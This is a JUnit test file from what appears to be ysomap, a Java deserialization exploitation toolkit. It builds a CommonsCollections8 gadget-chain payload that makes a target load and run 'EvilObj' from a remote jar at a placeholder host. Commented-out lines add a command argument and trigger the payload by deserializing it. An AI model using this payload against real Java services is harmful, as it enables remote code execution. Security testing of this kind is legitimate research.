package ysomap.core.bullet.collections;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.payload.java.collections.CommonsCollections8;

/**
 * @author wh1t3P1g
 * @since 2020/10/27
 */
public class TransformerWithURLClassLoaderBulletTest {

    @Test
    public void getObject() throws Exception {
        Payload payload = new CommonsCollections8();
        Bullet bullet = new TransformerWithURLClassLoaderBullet();
        bullet.set("jarUrl", "http://xxxx:23334/EvilObj.jar");
        bullet.set("remoteObj", "EvilObj");
//        bullet.set("args", "open /System/Applications/Calculator.app");
        payload.setBullet(bullet);
//        Serializer serializer = payload.getSerializer();
//        serializer.deserialize(serializer.serialize(payload.getObject()));
//        while (true);
    }
}